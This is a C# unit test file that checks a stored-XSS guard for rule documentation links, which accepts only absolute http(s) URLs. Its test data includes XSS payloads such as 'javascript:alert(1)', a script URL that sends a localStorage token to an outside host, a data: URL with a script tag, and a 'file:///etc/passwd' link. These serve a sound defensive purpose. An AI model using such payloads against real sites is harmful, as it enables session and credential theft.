using AutopilotMonitor.Functions.Services;
using AutopilotMonitor.Shared.DataAccess;
using AutopilotMonitor.Shared.Models;
using Microsoft.Extensions.Logging.Abstractions;
using Moq;

namespace AutopilotMonitor.Functions.Tests;

/// <summary>
/// Stored-XSS guard for analyze-rule relatedDocs: the author-controlled URL is rendered as
/// an anchor href for every viewer (including cross-tenant admins), so only absolute
/// http(s) URLs may persist. Create and Update both reject anything else with an
/// <see cref="ArgumentException"/> (400), and drop blank entries silently.
/// </summary>
public class AnalyzeRuleRelatedDocsUrlTests
{
    private const string TenantId = "a1b2c3d4-e5f6-7890-abcd-ef1234567890";

    [Theory]
    [InlineData("https://learn.microsoft.com/x", true)]
    [InlineData("http://example.com/", true)]
    [InlineData("  https://example.com/a?b=c#d ", true)]
    [InlineData("javascript:alert(1)", false)]
    [InlineData("JavaScript:fetch('https://example.com/'+localStorage.token)", false)]
    [InlineData("data:text/html,<script>alert(1)</script>", false)]
    [InlineData("vbscript:msgbox(1)", false)]
    [InlineData("file:///etc/passwd", false)]
    [InlineData("/relative/path", false)]
    [InlineData("example.com", false)]
    [InlineData("", false)]
    [InlineData(null, false)]
    public void IsAbsoluteHttpUrl_allows_only_absolute_http_and_https(string? url, bool expected)
    {
        Assert.Equal(expected, AnalyzeRuleService.IsAbsoluteHttpUrl(url));
    }

    [Fact]
    public async Task CreateRuleAsync_rejects_javascript_url_and_never_persists()
    {
        var repo = new Mock<IRuleRepository>(MockBehavior.Strict);
        repo.Setup(r => r.AnalyzeRuleExistsAsync(It.IsAny<string>(), It.IsAny<string>())).ReturnsAsync(false);
        var service = new AnalyzeRuleService(repo.Object, NullLogger<AnalyzeRuleService>.Instance);

        var rule = MakeRule(new RelatedDoc { Title = "Microsoft Docs: fix this error", Url = "javascript:alert(1)" });

        var ex = await Assert.ThrowsAsync<ArgumentException>(() => service.CreateRuleAsync(TenantId, rule));
        Assert.Contains("javascript:alert(1)", ex.Message);
        repo.Verify(r => r.StoreAnalyzeRuleAsync(It.IsAny<AnalyzeRule>(), It.IsAny<string>()), Times.Never);
    }

    [Fact]
    public async Task UpdateRuleAsync_rejects_data_url_for_custom_rule()
    {
        var repo = new Mock<IRuleRepository>(MockBehavior.Strict);
        var service = new AnalyzeRuleService(repo.Object, NullLogger<AnalyzeRuleService>.Instance);

        var rule = MakeRule(new RelatedDoc { Title = "Docs", Url = "data:text/html,<script>alert(1)</script>" });

        await Assert.ThrowsAsync<ArgumentException>(() => service.UpdateRuleAsync(TenantId, rule));
        repo.Verify(r => r.StoreAnalyzeRuleAsync(It.IsAny<AnalyzeRule>(), It.IsAny<string>()), Times.Never);
    }

    [Fact]
    public async Task CreateRuleAsync_keeps_https_docs_and_drops_blank_entries()
    {
        AnalyzeRule? stored = null;
        var repo = new Mock<IRuleRepository>(MockBehavior.Strict);
        repo.Setup(r => r.AnalyzeRuleExistsAsync(It.IsAny<string>(), It.IsAny<string>())).ReturnsAsync(false);
        repo.Setup(r => r.StoreAnalyzeRuleAsync(It.IsAny<AnalyzeRule>(), TenantId))
            .Callback<AnalyzeRule, string>((r, _) => stored = r)
            .ReturnsAsync(true);
        var service = new AnalyzeRuleService(repo.Object, NullLogger<AnalyzeRuleService>.Instance);

        var rule = MakeRule(
            new RelatedDoc { Title = "Good", Url = "https://learn.microsoft.com/x" },
            new RelatedDoc { Title = "", Url = "" },          // editor "+ Add Link" default, untouched
            new RelatedDoc { Title = "Blank", Url = "   " });

        Assert.True(await service.CreateRuleAsync(TenantId, rule));
        Assert.NotNull(stored);
        var doc = Assert.Single(stored!.RelatedDocs);
        Assert.Equal("https://learn.microsoft.com/x", doc.Url);
    }

    private static AnalyzeRule MakeRule(params RelatedDoc[] docs) => new()
    {
        RuleId = "TENANT-DOCS-URL-001",
        IsBuiltIn = false,
        IsCommunity = false,
        RelatedDocs = docs.ToList(),
    };
}
